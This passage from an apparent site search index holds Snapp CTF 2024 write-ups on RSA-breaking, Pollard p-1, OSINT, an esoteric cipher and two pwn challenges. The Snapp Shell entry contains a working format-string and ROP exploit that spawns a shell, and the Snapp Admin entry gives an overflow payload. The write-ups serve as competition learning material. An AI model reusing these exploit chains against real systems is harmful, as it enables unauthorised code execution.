\\(xp + 1\\) or \\(xp\\). it all depends on if \\(xp\\) is even or odd. we know that <code>P</code> and <code>Q</code> should be prime so they can not be in form of \\(P = xp\\)  and \\(Q = yp\\) so they should be in form of \\(P = xp + 1\\) and \\(Q = yp + 1\\)</li> <li>return <code>P</code> and <code>Q</code> when they both are prime and these are our RSA factors</li> </ol> </li> </ol> </li> </ol> <p>if we look deep into the algorithm the value of <code>P</code> and <code>Q</code> are highly dependent on our seed value and length. Let's run the code with seed  <code>0</code></p> <p></p> <p>as we can see the primes are large although the value <code>v</code> is small but the <code>e</code> is large because of small length of seed let's examine this seed <code>'0'*59</code></p> <p></p> <p>our <code>v</code> and <code>e</code> are the smallest possible and we can see the factors are very small that makes it easy to factorize <code>n</code> and break RSA but there is an issue here </p> <p>because our <code>n</code> is very small (<code>n&lt;m</code>) so we can not get the encrypted flag. let's see how n is generated based on our seeds</p>  $n = P \\cdot Q$  $P = p \\cdot x + 1$  $Q = p \\cdot y + 1$  $n = (p \\cdot x + 1) \\cdot (p \\cdot y + 1) \\quad \\longrightarrow \\quad 2^{\\left(\\frac{\\log_2{p}}{4}-1\\right)} &lt; x,y &lt; 2^{\\frac{\\log_2{p}}{4}}$  $n = (p^2) \\cdot (x \\cdot y) + p \\cdot x + p \\cdot y + 1$  <p>The solution I was thinking about was about first find <code>p</code> then find <code>x,y</code> and calculate <code>P,Q</code>. I was thinking about brute-forcing them but it only is possible when they are small. let's see how we can feed our algorithm with a seed that <code>p,x,y</code> are small meanwhile <code>P</code> and <code>Q</code> are large enough such that <code>n &gt; m</code>.</p> <p>The thing I was sure about to consider <code>l</code> as maximum possible value (60) because it results in small <code>e</code> then small <code>w</code> we know  <code>w</code> is only dependent on <code>l</code> and <code>p</code> is dependent on <code>r</code> and <code>u</code> because we have the value <code>u</code> we only need <code>1 &lt; r &lt; w</code> to find <code>p</code>. so the larger <code>l</code> leads to smaller <code>e</code> and smaller <code>w</code> and smaller <code>r</code> and makes it easier to find <code>r</code> if we consider <code>l</code> as 60 the <code>w</code> will value be like this</p>  $l = 60$  $e = (64-l)*2^{4}$  $e = 4*2^{4}$  $e = 64$  $w = 2^{(e/2)}$  $w = 2^{32}$  $w = 4294967296$  $1 &lt; r &lt; 4294967296$  <p>we have <code>u</code> we only need to predict r to find p</p> <p>after some trial/error I found this value which generates reasonable value for p that \\(P*Q &gt; m\\) and also \\(x,y\\) are not large</p> <pre><code>000000000000000000000000000000000000000000000000027aaaaaaaa\n</code></pre> <p></p> <p>after trying several times with seed value of <code>000000000000000000000000000000000000000000000000027aaaaaaaa</code> and failing of <code>asser m &lt; n</code> finally I could get a pair of <code>n,c</code> like this </p><pre><code>n = 37931218957771298432929684440033399181023597655092027699229762505394899064299\nc = 37619517047698062658731745404907573919781841044311054904796485400329681024110\n</code></pre><p></p> <p>here we have these conditions</p> <pre><code>1 &lt; r &lt; 4294967296\n\n&gt;&gt;&gt; p = 3142717113053520895163729936831\n&gt;&gt;&gt; p.bit_length() &gt;&gt; 2\n25\n&gt;&gt;&gt; 2 ** 24\n16777216\n&gt;&gt;&gt; 2 ** 25\n33554432\n\n2*16777216 &lt; x , y &lt; 2*33554432\n</code></pre> <p>OK now we can brute force the range <code>(1, 4294967296)</code> to find <code>r</code> but how to verify what the correct <code>r</code> is? we know that:</p> <p></p><pre><code>n = (p**2)*(x*y) + p*x + p*y + 1\n# we can verify correct r like this\n\nif (n-1) % (u+r) == 0\n# p = u + r\n</code></pre> \\(n = (p^2)(x \\cdot y) + p \\cdot x + p \\cdot y + 1\\)<p></p> <p>We can verify correct \\(r\\) like this:</p> <p>If \\((n - 1) \\mod (u + r) = 0\\), then \\(p = u + r\\).</p> <p>after find the correct <code>r</code> we can brute force and find <code>x,y</code> like this we know that \\(P = x*p + 1\\) so <code>n</code> divides \\(x*p + 1\\) so \\(n-1\\) divides both  <code>x</code> and <code>p</code></p> <pre><code>bits = p.bit_length() &gt;&gt; 2 # bits = 25\nfor x in range(2 * 2**(bits-1), 2*2**bits):\n    if (n % (x*p + 1)) == 0:\n        print(x)\n</code></pre> <p>Let's code all these levels to see if we can recover <code>p,x,y</code> and factorize <code>n</code></p> <pre><code>from Crypto.Util.number import *\n\nn = 37931218957771298432929684440033399181023597655092027699229762505394899064299\nc = 37619517047698062658731745404907573919781841044311054904796485400329681024110\ns = '000000000000000000000000000000000000000000000000027aaaaaaaa\\n'\n\nv, l = int(s, 16), len(s)\ne = (64 - l) &lt;&lt; 4\nu, w = v &lt;&lt; e, 2 ** (e &gt;&gt; 1)\n\nr = 0\nfor rr in range(w, 0, -1):\n    p = rr + u\n    if (n-1) % p == 0:\n        r = rr\n        print(f\"r = {r}\")\n\nxy = []\nbits = p.bit_length() &gt;&gt; 2\nfor x in range(2 * 2**(bits-1), 2*2**bits):\n    if (n % (x*p + 1)) == 0:\n        print(x)\n        xy.append(x)\n\np = r + u\n\nP = xy[0]*p + 1\nQ = xy[1]*p + 1\ne = 0x10001\nphi = (P-1)*(Q-1)\nd = inverse(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m).decode()\nprint(flag)\n</code></pre> <p>the code will take some time to find the correct <code>r</code> but after that it will find <code>x,y</code> and decrypts the flag</p> <p></p> <pre><code>SNAPP{b3Y0nd_4Ny_FoRM_1n_8lEx!?}\n</code></pre> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Bombastic/","title":"Bombastic","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Bombastic/#bombastic","title":"Bombastic","text":"<pre><code>#!/usr/bin/env python3\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef check(n):\n  sn = str(n)\n  l, P = len(str(n)), []\n  for i in range(1, l - 1):\n    for j in range(i + 1, l):\n      g, e, a = int(sn[:i]), int(sn[i:j]), int(sn[j:])\n      if isPrime(g ** e + a):\n        P.append(g ** e + a)\n      if isPrime(g** e - a):\n        P.append(g ** e - a)\n  return P\n\ndef keygen(nbit):\n  while True:\n    r = getRandomNBitInteger(18)\n    if len(check(r)) != 0:\n      cr = check(r)\n      cr.sort()\n      p = cr[-1]\n      if p.bit_length() &gt;= nbit:\n        return r, p\n\ndef encrypt(msg, pubkey):\n  m = bytes_to_long(msg)\n  assert m &lt; pubkey\n  c = pow(m, 65537, pubkey)\n  return c\n\np, q = keygen(256)[1], keygen(256)[1]\npubkey = p * q\nenc = encrypt(flag, pubkey)\n\nprint(f'n = {pubkey}')\nprint(f'enc = {enc}')\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Bombastic/#solution","title":"Solution","text":"<p>At the first view I couldn't understand the prime generation algorithm neither in static nor dynamic approach. So I passed the <code>n</code> to RsaCtfTool to see what is the issue about generating primes in this strange way. this is the output of the tool</p> <p></p> <p>so it is all about mersenne primes, after searching about them it seems they are primes that are in form of \\(2^{n} - 1\\). I generated two primes with this algorithm to examine them </p> <p>it seems these numbers are not form of \\(2^{n} - 1\\) but the number 1 may be different for them so I used this code to find what form they are in:</p> <pre><code>p = 858099707516326214372737599885174152158679412517913176174307932398192897924707006515319955082681819372162038923935107254640248499964580476571753536389382243\nq = 2462625387274654950767440006258975862817483704404090416746768337765357610718575663213391640930307227550414249394111\n\nfor i in range(-1000, 10000):\n    if (p + i) % 2**32 == 0:\n        print(f\"p =&gt; 2**n - {i}\")\n    if (q + i) % 2**32 == 0:\n        print(f\"q =&gt; 2**n - {i}\")\n</code></pre> <p></p> <p>so in this example we see that p is in form of \\(2^{n} + 99\\) and q is in form of \\(2^{n} - 65\\) Finally I used RsaCtfTool to decrypt the <code>c</code> with mersenne primes method</p> <p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Cryptos/","title":"Cryptos","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Cryptos/#cryptos","title":"Cryptos","text":"<p>Discover the world of\u00a0cryptos\u00a0in SNAPP CTF, solve challenges, and kindle your love for cryptography with exciting tasks.</p> <pre><code>#!/usr/bin/env python3\n\nfrom decimal import *\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef encode(n, p):\n  getcontext().prec = p + len(str(n)) + 2\n  x, y = Decimal(n), Decimal(1)\n  r = Decimal(10) ** Decimal(-p)\n  while x &gt;= r + y:\n    x = (x + y) / 2\n    y = n / x\n  result = str(round(x - (r / 2), p)).replace('.', '')[::-1]\n  return result\n\ndef encrypt(msg, n):\n  assert n &gt;= 2\n  m = n * bytes_to_long(msg)\n  c = encode(m, p).lstrip('0')\n  return c\n\nglobal p\np = 1024\nn = getRandomNBitInteger(p &gt;&gt; 6)\nc = encrypt(flag, n)\nprint(f'c = {c}')\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Cryptos/#solution","title":"Solution","text":"<p>the code is pretty much simple, it's encoding a message in these steps:</p> <ol> <li>it generates a <code>(1024&gt;&gt;6)</code> or 16 bit random number [32768, 65536]</li> <li>multiply flag decimal value by it</li> <li>encode it using this algorithm<ol> <li>\\(x = n, y = 1\\)</li> <li>\\(x = (x+y) / 2\\) , \\(y = n/x\\)</li> <li>repeat until \\(x \\geq y + r\\) : (r is very small value near to zero)</li> </ol> </li> <li>round <code>x</code> by <code>p</code> floating point which is \\(1024 + len(n) + 2\\)</li> <li>eliminate the <code>.</code> and reverse it</li> </ol> <p>if we switch to dynamic approach we can see that the loop is about taking square root of initial value</p> <p></p> <p></p> <p>so the encode function will be simply like this</p> <pre><code>def encode(n, p):\n  getcontext().prec = p + len(str(n)) + 2\n  x, y = sqrt(n)\n  result = str(round(x - (r / 2), p)).replace('.', '')[::-1]\n  return result\n</code></pre> <p>to get <code>m*n</code> we should first reverse the result then power it up to exponent 2 </p> <p>I used this code to do that </p><pre><code>c = '5045178894357626075431384420860360647034114401723872009235472900716359915220507491073960091678247276121410336208043903213023270852375878447784137648224298070437468162688759757920721723781604874151511572882769621941513872944171938170800255953999521262507633248122058585326636562475057264132441892290385234155811673238225858794265110896113943435633328964169010801463217935967353264871894098875705195581754210881067786818256285938683517110450003983693265702180080692280190636422223594905498601205618208238650519192521153660957941553495169629553425307135627310090665836554328620333233651748363605006405700561070148067374204713428800371202120708720303368873063856187395746236050232433322757367599705756026681249243491427692831512293583163552663661247047141621453850846452005560242532098020050458041224274532870717854358073569467859182280543593485795867269334718276231423506951784977870960076921603401799962900400216905993065516167476079796078242649399762978533503541077936264107413956207423841535073828559129349967201715665207852577917834390795702440085535969037233161141789375751'\nc = c[::-1].replace('.', '')\nmn = int(str(int(c) ** 2)[:-2048]) + 1\n</code></pre><p></p> <p>the reason I remove the the floating point <code>.</code> and calculate it's second power then eliminate last 2048 digits is a basic mathematical method we learnt in fourth class it is about multiplying float numbers which says multiply the numbers without considering the floating point, after multiplying them add the floating point for sum of number of digits for two numbers which here is <code>2*1024=2048</code>. at the end I add an extra  <code>1</code> because the floating most significant digits are all 9 which means we need extra 1.</p> <p>here is the final code which decode the flag</p> <pre><code>from Crypto.Util.number import *\n\nc = '5045178894357626075431384420860360647034114401723872009235472900716359915220507491073960091678247276121410336208043903213023270852375878447784137648224298070437468162688759757920721723781604874151511572882769621941513872944171938170800255953999521262507633248122058585326636562475057264132441892290385234155811673238225858794265110896113943435633328964169010801463217935967353264871894098875705195581754210881067786818256285938683517110450003983693265702180080692280190636422223594905498601205618208238650519192521153660957941553495169629553425307135627310090665836554328620333233651748363605006405700561070148067374204713428800371202120708720303368873063856187395746236050232433322757367599705756026681249243491427692831512293583163552663661247047141621453850846452005560242532098020050458041224274532870717854358073569467859182280543593485795867269334718276231423506951784977870960076921603401799962900400216905993065516167476079796078242649399762978533503541077936264107413956207423841535073828559129349967201715665207852577917834390795702440085535969037233161141789375751'\nc = c[::-1].replace('.', '')\nmn = int(str(int(c) ** 2)[:-2048]) + 1\n\nfor n in range(2**15, 2**16):\n    if mn % n == 0:\n        m = mn // n\n        flag = long_to_bytes(m).decode()\n        if 'SNAPP' in flag:\n            print(flag)\n</code></pre> <p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Grail/","title":"Grail","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Grail/#grail","title":"Grail","text":"<p>Grail cryptosystem employs elementary math to safeguard valuable secrets. Despite strengths, it harbors vulnerabilities requiring careful consideration.</p> <pre><code>#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef make_prime(nbit):\n  while True:\n    p = 2\n    for _ in range(nbit &gt;&gt; 5):\n      p *= getPrime(nbit &gt;&gt; 4)\n    p += 1\n    if isPrime(p):\n      return p\n\ndef encrypt(msg, pubkey):\n  m = bytes_to_long(msg)\n  assert m &lt; pubkey\n  c = pow(m, 0x10001, pubkey)\n  return c\n\nnbit = 512\np = make_prime(512)\nq = getPrime(2 * nbit - p.bit_length())\n\npubkey = p * q ** 2\nenc = encrypt(flag, pubkey)\n\nprint(f'n = {pubkey}')\nprint(f'c = {enc}')\n</code></pre> <p>this challenge is about generating two prime factors and a public modulus <code>n</code> like <code>n = p * q * q</code> and encrypt a flag with it the prime generation part is interesting let's see what's happening</p> <pre><code>def make_prime(nbit):\n  while True:\n    p = 2\n    for _ in range(nbit &gt;&gt; 5):\n      p *= getPrime(nbit &gt;&gt; 4)\n    p += 1\n    if isPrime(p):\n      return p\n</code></pre> <p>if we look at the algorithm, the prime generation isn't trivial safe method and is like this:</p>  $p, q = x_1 \\cdot x_2 \\cdot x_3 \\cdot x_4 \\cdot x_5 \\cdot \\ldots \\cdot x_{16} + 1$  $2^{31} &lt; x_1, x_2, x_3, \\ldots, x_{16} &lt; 2^{32}$  <p>in mathematics we call these numbers smooth numbers. in another words both <code>p-1</code> and <code>q-1</code> have prime factors less than <code>4294967296</code> which are called 32-bit smooth numbers. you can read about smooth numbers here. using of smooth numbers when generating prime factors is not a safe idea. because there is an algorithm called pollard p-1 which is about factoring a composite number <code>n</code> while all its prime factors <code>p-1</code> are  power-smooth. and this smoothness is not that large (here it is 32 bit which is reasonable) </p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Grail/#solution","title":"Solution","text":"<p>By definition </p> <p>Further, m is called B-powersmooth (or B-ultrafriable) if all prime powers \\(p^v\\) dividing m satisfy: \\(p^v \\leq B\\)</p> <p>Here we can use <code>Pollard's p \u2212 1</code> algorithm because our integer <code>n</code>'s factor <code>p-1</code>,<code>q-1</code> are <code>4294967296-smooth</code> which satisfies our conditions.</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Grail/#pollards-p-1-algorithm","title":"Pollard's p \u2212 1 Algorithm","text":"<p>Here are the overall steps:</p> <ol> <li>select a smoothness bound <code>B</code> (we should use <code>4294967296</code>)</li> <li>choose a random base <code>a</code> co-prime to <code>n</code></li> <li>define <code>M = factorial(B)</code></li> <li>compute <code>g = gcd(a**M - 1, n)</code></li> <li>if <code>1 &lt; g &lt; n</code> then <code>g</code> is one of the factors</li> <li>if <code>g == 1</code> select larger <code>B</code> and try again</li> <li>if <code>g == n</code> select smaller <code>B</code> and try again</li> </ol>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Grail/#pollards-p-1-algorithms-proof","title":"Pollard's p \u2212 1 Algorithm's proof","text":"<p>Let's see how this algorithm works</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Grail/#fermats-little-theorem","title":"Fermat's Little Theorem","text":"<p>We know that for every prime number <code>p</code> and a random number <code>a</code> co-prime to <code>p</code> we can write</p>  $a^{(p-1)} \\equiv 1 \\pmod{p}$  or  $a^{(p-1)} - 1 = p \\cdot r$  <p>In other words \\(a^{(p-1)} - 1\\) has two factors <code>p,r</code> and <code>p</code> is prime. We can also multiply <code>p-1</code> with <code>k</code>:</p>  $a^{k \\cdot (p-1)} \\equiv 1 \\pmod{p}$  or  $a^{k \\cdot (p-1)} - 1 = p \\cdot s$"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Grail/#the-proof","title":"The proof","text":"<p>From previous equations we can conclude:</p>  $\\text{gcd}(a^{k \\cdot (p-1)} - 1, n) = p$  $\\text{B} = k \\cdot (p-1)$  $\\text{gcd}(a^B - 1, n) = p$  <p>If we can calculate <code>B</code> and choose any integer <code>a</code> co-prime to <code>n</code>(2 is the best choice), then we can find <code>p</code> with <code>gcd</code> operation. simple huh?! But how to find <code>B</code>. We know that:</p>  $B = k \\cdot (p-1)$  $p-1 = p_1 \\cdot p_2 \\cdot p_3 \\cdot \\ldots \\cdot p_x$  <p>And we know that <code>p-1</code> is <code>power-smooth</code> which means that all factors of <code>p-1</code>(<code>p1, p2, ..., px</code>) are less than <code>4294967296</code> So if we choose B=\\(1.2.3.4.....4294967296\\) and calculate that we can assure that <code>B</code> has <code>p</code> inside its factor and gcd of \\(a^{B} - 1\\) with <code>n</code> will result in <code>p</code> which is one of the factors.</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Grail/#final-solution","title":"Final Solution","text":"<p>All sounds cool! but is it easy to calculate <code>factorial(4294967296)</code> specially in python? definitely not! it will take a looong time and memory to find those primes. instead of that I used ecm utils, which is a powerful and optimal integer factorization tools, you can also use yafu which it also uses ecm.</p> <p>if we look at the man page of ecm we see we can use it for special purposes like pollard p-1 algorithm</p> <p></p> <p>how to use ecm for our goal, if we look at Two-stage variant of this link we see that there is another variant for pollard p-1 algorithm which are for composite numbers that their prime factors <code>p-1</code> have two different boundaries for their prime factors one is B1 an the other is B2. if we look at the man page of ecm it implements this utility by providing two boundaries <code>B1</code> and <code>B2</code>. because we only have one boundary here (<code>2**32</code>) we can put equal value for both of them and use it for our goal</p> <p>so we're gonna use ecm with two equal boundaries </p><pre><code>\u279c  ~ echo 60271408980729933877006968813908832767217070740159093498648400768736607939292481938381401022966688543630910474432361244613651991411572432214753910349772891370476918909077112530540621911383966658026593134345274324134753562637349391036182588852497718523479144409580717389609520235592399501427008877619567949880750992502426829388092423290210227355740274649904830512823177150165653995357199403968315206581509860688738386215498703336824919554943205899149182547563125887 | ecm -pm1 4294967296 4294967296\nGMP-ECM 7.0.4 [configured with GMP 6.2.1, --enable-asm-redc] [P-1]\nInput number is 60271408980729933877006968813908832767217070740159093498648400768736607939292481938381401022966688543630910474432361244613651991411572432214753910349772891370476918909077112530540621911383966658026593134345274324134753562637349391036182588852497718523479144409580717389609520235592399501427008877619567949880750992502426829388092423290210227355740274649904830512823177150165653995357199403968315206581509860688738386215498703336824919554943205899149182547563125887 (464 digits)\nUsing B1=4294967296, B2=4294967328, polynomial x^1, x0=4248787747\nStep 1 took 5257888ms\n********** Factor found in step 1: 167728479569738446790816571231448658833096894670942318978681577866959239045827693247942471269483925051228192824546223068950392538581153723850180934954663\nFound prime factor of 153 digits: 167728479569738446790816571231448658833096894670942318978681577866959239045827693247942471269483925051228192824546223068950392538581153723850180934954663\nComposite cofactor 359339148219430319280089093265239884758034574636452597711238478104459134171973120770298288584658864887725190578210632161098277750292496622577052826229137258086647336771350031270088547539336870855964992863875205318437496664120219095344484150789429241919483604923061620946207848824960877467377903440365432510559849 has 312 digits\nReport your potential champion to Paul Zimmermann &lt;zimmerma@loria.fr&gt;\n(see http://www.loria.fr/~zimmerma/records/Pminus1.html)\n</code></pre><p></p> <p></p> <p>excellent, we found the prime factor <code>p</code> and a composite factor which is <code>q**2</code> now let's write our final code to decrypt the flag. To be honest there is no need to calculate <code>q</code>. with just <code>p</code> and its relevant <code>d</code> you can find the flag because this is a <code>3-prime</code> variant of RSA.</p> <pre><code>echo 60271408980729933877006968813908832767217070740159093498648400768736607939292481938381401022966688543630910474432361244613651991411572432214753910349772891370476918909077112530540621911383966658026593134345274324134753562637349391036182588852497718523479144409580717389609520235592399501427008877619567949880750992502426829388092423290210227355740274649904830512823177150165653995357199403968315206581509860688738386215498703336824919554943205899149182547563125887 | ecm -pm1 4294967296 4294967296\np = 167728479569738446790816571231448658833096894670942318978681577866959239045827693247942471269483925051228192824546223068950392538581153723850180934954663\n</code></pre> <pre><code>from Crypto.Util.number import *\n\nn = 60271408980729933877006968813908832767217070740159093498648400768736607939292481938381401022966688543630910474432361244613651991411572432214753910349772891370476918909077112530540621911383966658026593134345274324134753562637349391036182588852497718523479144409580717389609520235592399501427008877619567949880750992502426829388092423290210227355740274649904830512823177150165653995357199403968315206581509860688738386215498703336824919554943205899149182547563125887\nc = 18438522198977155755872369073173517918203417931951458175663749127772053822610354477488382931648204112363708747300333279964863287907821749491918178632833296879643102108322183879396960621080385271708526432735445408218922762232344776571397157271654216251665202720050665755807242355490753461576547890363093564721184099967652686729464944824967135201979335166915502492388799588271020179969104407201131683522897318106586922050389249019689732226480944822582494823555270535\ne = 0x10001\n\np = 167728479569738446790816571231448658833096894670942318978681577866959239045827693247942471269483925051228192824546223068950392538581153723850180934954663\n\nassert (n % p) == 0\ndp = pow(e, -1, p-1)\n\nmp = pow(c, dp, p)\nprint(long_to_bytes(mp).decode())\n</code></pre> <p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/forensics/snapp_report/","title":"Snapp Report","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/forensics/snapp_report/#snapp-report","title":"Snapp Report","text":"<pre><code>The classified [**SNAPP report**](https://snappctf.com/tasks/snapp_report_6a0602c6d19b6aa8bb6b9fb75c3191a941af30da.txz) on the latest Capture The Flag (CTF) reveals groundbreaking strategies and vulnerabilities, reshaping cybersecurity paradigms.\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/forensics/snapp_report/#solution","title":"Solution","text":"<p>Starting with the challenge when I realized that the challenge is a pdf I searched for <code>pdf forensics ctf</code> and came across this link and so at first try with <code>Ctrl + A</code> I found there are some hidden texts inside the circle and so copied and pasted the text and figured the flag out HOWEVER at the time the flag was wrong on the platform and couldn't submit the flag until I saw that there were two solves figured that probably the flag is fixed and it was.</p> <p> </p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/misc/prying_eyes/","title":"Prying eyes","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/misc/prying_eyes/#description","title":"Description","text":"<pre><code>**\u03bb** a cryptic operator in esoteric languages, safeguards secret messages from **prying eyes**. Embrace its power to conceal truth. Can you read the following message:\n\n```s``.s`.1._`.:```k.tik`d`.F```.&amp;``c.E.C.Tr```s`.N`.S`._.S```.P`.P```k.Ad._._i`.e`.h`.tk\n\n**Flag:** `SNAPP{Secret_Message}`\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/misc/prying_eyes/#solution","title":"Solution","text":"<p>After long hours of searching in cipher identifiers and searching for lambda and prying eyes, I decided to search for esoteric languages and lambda (<code>\u03bb a cryptic operator in esoteric languages</code>) which led me to here leading to here and then here making sure of the name tried searching for online compilers and finally getting the flag from this tools</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_bounties/","title":"Snapp Bounties","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_bounties/#snapp-bounties","title":"Snapp Bounties","text":"<p>How many reports has\u00a0SNAPP\u00a0paid bounties for? How many hackers have been paid bounties? Concatenate the first number to the second and send the flag as\u00a0<code>SNAPP{X-Y}</code>, where\u00a0<code>X</code>\u00a0and\u00a0<code>Y</code>\u00a0are the answers to the questions.</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_bounties/#solution","title":"Solution","text":"<p>I searched about snapp bug bounty program statistics like below</p> <p></p> <p>the first link was a blog post about snapp bug bounty program which indicates snapp paid 80 bounties for 36 hackers </p> <p></p> <p>and this is the flag</p> <pre><code>SNAPP{80-36}\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_customers/","title":"Snapp Customers","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_customers/#snapp-customers","title":"Snapp Customers","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_customers/#description","title":"Description","text":"<p><code>SNAPP Customers What is the total number of employees in SNAPP's subsidiary companies? What is the total number of users of SNAPP Super App? How many items are in the largest order of SNAPP Food? Please send the answer in the format SNAPP{X-Y-Z}, where X, Y, and Z are the answers to the questions respectively.</code></p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_customers/#solution","title":"Solution","text":"<p>During my Open Source Intelligence (OSINT) investigation, I uncovered valuable information related to the question by exploring Google search results. The key lead I followed was the reference to a document titled \"1401 Annual Report.\" The next step involved accessing and scrutinizing the content within the \"1401 Annual Report.\" This document likely contains pertinent information relevant to the initial question. </p> <p> </p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_records/","title":"Snapp Records","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_records/#snapp-records","title":"Snapp Records","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_records/#description","title":"Description","text":"<p><code>SNAPP Record What is the record for the number of trips made by SNAPP in a single day? What is the record for the number of transactions with SNAPP Pay credit service? Please send the answer in the format SNAPP{X-Y}, where X and Y are the answers to the questions respectively.</code></p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_records/#solution","title":"Solution","text":"<p>I've just searched question in persian with Google.</p> <p> </p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_saving/","title":"Snapp Saving","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_saving/#snapp-saving","title":"Snapp Saving","text":"<p>Which SNAPP service allows saving 250,000 Tomans in month? Send the answer like <code>SNAPP{SERVICENAME}</code>.</p> <p>after googling some key words:</p> <p></p> <p></p> <p>it seems the service is snapp pro. so the flag would be like this</p> <pre><code>SNAPP{SNAPPPRO}\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/pwn/snapp_admin/","title":"Snapp admin","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/pwn/snapp_admin/#snapp-admin","title":"Snapp Admin","text":"<pre><code>I'm in a hurry and I don't have enough money. Find my [**discount**](https://snappctf.com/tasks/snapp_admin_d2cb1554b1532e3735e4c6f31d8cc396b356083c.txz) code.\n\n`nc 91.107.177.236 1337`\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/pwn/snapp_admin/#solution","title":"Solution","text":"<p>At first I ran the program to analyse how does it work, after that realizing that the first input is not vulnerable to overflow, I searched the program for the password that it was asking and reading the assembly code of the program I figured that with  correct password ( <code>9606</code> ) there is a way to a <code>gets</code> function which allows overflow ( 56 length padding ) to jump inside the <code>is_admin</code> function however there is a condition which can be bypassed easily by just passing the address after the condition which shows the flag.</p> <p>payload: <code>b'9606\\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa'+p64(0x00401307)</code></p> <p></p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/pwn/snapp_shell/","title":"Snapp shell","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/pwn/snapp_shell/#snapp-shell","title":"Snapp Shell","text":"<pre><code>My [**shell**](https://snappctf.com/tasks/snappshell_fc8d87fc117c34914b7c1b1d1255e6305ae9a072.txz) is broken, can you fix it for me? No you can't = )\n\n`nc 91.107.177.236 3117`\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/pwn/snapp_shell/#solution","title":"Solution","text":"<p>There was 4 functionality in the program, one was exit, other one was cat which was disabled and there were two functionality which were useful for the exploitation, <code>echo</code> function that was vulnerable to format string and was used to leak the canary and address of <code>main</code> function and the base of program for gadgets that we might need, and the <code>find_index</code> function which  was vulnerable to overflow with <code>gets</code> function allowing us to jmp wherever we need.</p> <p>After a long search for pop rdi gadget to leak the libc address to bypass ASLR, I was hopelessly searching writeups to figure what to do when I found https://ctftime.org/writeup/36368 which was the Idea and once more I opened r2 and found out that it is actually there with a <code>0x62050</code> difference to the libc base address, so used puts function to leak that and after that return again to main and after that using the pop rdi gadget inside libc to pop bin/sh string to the rdi and finally calling system function.</p> <pre><code>p=process('./snapp_shell')\n\n# Leak canary\np.sendline('1')\np.recvuntil('input\\n')\np.sendline('%7$p')\nx=p.recvline()\ncan=p64(int(x,16))\n\n# get main address\np.sendline('1')\np.recvuntil('input\\n')\np.sendline('%15$p')\nx=p.recvline()\nmain=int(x,16)\n\n# Compute some useful addresses or just set to find their real address later\nexe = main-0x0000140d\nputs = exe+0x10e4\nret = exe+0x101a\ndiff = 0x62050\nsystem = 0x50d70\nbinsh = 0x1d8678\npop_rdi = 0x2a3e5\n\n# First step exploit\np.sendline('3')\npay=b'SNAPPaaaabaaacaaadaaaeaa'+can+b'aaaabaaa'+p64(ret)+p64(puts)+p64(ret)+p64(main)\np.sendline(pay)\np.recvuntil('input is')\np.recvline()\nlc = p.recvline()\nlcd = u64(lc[:-1]+b'\\x00\\x00')\nlibc = lcd - diff\n\n# Second step exploit\np.sendline('3')\npay=b'SNAPPaaaabaaacaaadaaaeaa'+can+b'aaaabaaa'+p64(ret)+p64(libc+pop_rdi)+p64(libc+binsh)+p64(libc+system)\np.sendline(pay)\n</code></pre> <p></p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/blink/","title":"Blink","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/blink/#blink","title":"Blink","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/blink/#description","title":"Description","text":"<pre><code>In the\u00a0Blink\u00a0of an eye, the reverse challenge unveiled secrets that should forever remain buried and 